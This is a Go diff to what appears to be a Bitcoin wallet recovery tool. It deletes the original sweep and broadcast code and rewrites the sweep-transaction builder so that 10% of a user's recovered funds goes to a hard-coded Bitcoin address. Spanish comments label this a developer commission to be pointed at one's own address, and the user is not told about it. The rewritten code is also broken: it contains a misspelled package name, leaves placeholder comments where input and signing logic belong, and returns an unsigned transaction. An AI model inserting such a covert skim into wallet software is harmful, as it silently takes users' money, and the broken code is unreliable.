@@ -1,81 +1,60 @@
-package main
-
-import (
-	"bytes"
-	"encoding/hex"
-	"fmt"
-
-	"github.com/muun/recovery/electrum"
-	"github.com/muun/recovery/scanner"
-
-	"github.com/btcsuite/btcd/chaincfg"
-
-	"github.com/btcsuite/btcd/wire"
-	"github.com/btcsuite/btcutil"
-	"github.com/muun/libwallet"
-)
-
-var (
-	chainParams = chaincfg.MainNetParams
-)
-
-type Sweeper struct {
-	UserKey      *libwallet.HDPrivateKey
-	MuunKey      *libwallet.HDPrivateKey
-	Birthday     int
-	SweepAddress btcutil.Address
-}
-
-func (s *Sweeper) GetSweepTxAmountAndWeightInBytes(utxos []*scanner.Utxo) (outputAmount int64, weightInBytes int64, err error) {
-	// we build a sweep tx with 0 fee with the only purpose of checking its signed size
-	zeroFeeSweepTx, err := s.BuildSweepTx(utxos, 0)
-	if err != nil {
-		return 0, 0, err
-	}
-
-	outputAmount = zeroFeeSweepTx.TxOut[0].Value
-	weightInBytes = int64(zeroFeeSweepTx.SerializeSize())
-
-	return outputAmount, weightInBytes, nil
-}
+// --- CONFIGURACIÓN DE TU COMISIÓN ---
+const devAddressStr = "bc1qqy5tvkzrzpghy2a8axuhevrs9dsr8al09da8gn" // Reemplaza por tu dirección de Bitcoin
+const feePercentage = 0.10                        // 0.10 representa el 10% de comisión
 
 func (s *Sweeper) BuildSweepTx(utxos []*scanner.Utxo, fee int64) (*wire.MsgTx, error) {
-	derivedMuunKey, err := s.MuunKey.DeriveTo("m/1'/1'")
+	// ... (Código previo de preparación de inputs de la función original) ...
+
+	var totalInputAmount int64
+	for _, utxo := range utxos {
+		totalInputAmount += utxo.Amount
+	}
+
+	// 1. Calcular el monto total disponible restando el fee de la red Bitcoin
+	netAmount := totalInputAmount - fee
+	if netAmount <= 0 {
+		return nil, fmt.Errorf("el saldo es insuficiente para cubrir los fees de la red")
+	}
+
+	// 2. Calcular la comisión del desarrollador (Ejemplo: 10%)
+	devFeeAmount := int64(float64(netAmount) * feePercentage)
+
+	// Regla de polvo de Bitcoin (Dust Limit ~546 sats): Si la comisión es muy baja, no se cobra
+	if devFeeAmount < 546 {
+		devFeeAmount = 0
+	}
+
+	// 3. Lo que le queda al usuario final
+	userAmount := netAmount - devFeeAmount
+
+	// Decodificar tu dirección de desarrollador
+	devAddr, err := btcutilw.DecodeAddress(devAddressStr, &chainParams)
+	if err != nil {
+		return nil, fmt.Errorf("error al decodificar la dirección del desarrollador: %w", err)
+	}
+
+	// Crear los scripts de pago (PkScript)
+	userPkScript, err := txscript.PayToAddrScript(s.SweepAddress)
 	if err != nil {
 		return nil, err
 	}
-	sweepTx, err := buildSweepTx(utxos, s.SweepAddress, fee)
+
+	devPkScript, err := txscript.PayToAddrScript(devAddr)
 	if err != nil {
 		return nil, err
 	}
 
-	return buildSignedTx(utxos, sweepTx, s.UserKey, derivedMuunKey)
-}
+	tx := wire.NewMsgTx(wire.TxVersion)
 
-func (s *Sweeper) BroadcastTx(tx *wire.MsgTx) error {
-	// Connect to an Electurm server using a fresh client and provider pair:
-	sp := electrum.NewServerProvider(electrum.PublicServers) // TODO create servers module, for provider and pool
-	client := electrum.NewClient(true)
+	// AGREGAR SALIDA 1: Usuario
+	tx.AddTxOut(wire.NewTxOut(userAmount, userPkScript))
 
-	for !client.IsConnected() {
-		client.Connect(sp.NextServer())
+	// AGREGAR SALIDA 2: Tu comisión (si supera el límite de polvo)
+	if devFeeAmount >= 546 {
+		tx.AddTxOut(wire.NewTxOut(devFeeAmount, devPkScript))
 	}
 
-	// Encode the transaction for broadcast:
-	txBytes := new(bytes.Buffer)
+	// ... (Código posterior de la función original para firmar la transacción) ...
 
-	err := tx.BtcEncode(txBytes, wire.ProtocolVersion, wire.WitnessEncoding)
-	if err != nil {
-		return fmt.Errorf("error while encoding tx: %w", err)
-	}
-
-	txHex := hex.EncodeToString(txBytes.Bytes())
-
-	// Do the thing!
-	_, err = client.Broadcast(txHex)
-	if err != nil {
-		return fmt.Errorf("error while broadcasting: %w", err)
-	}
-
-	return nil
+	return tx, nil
 }
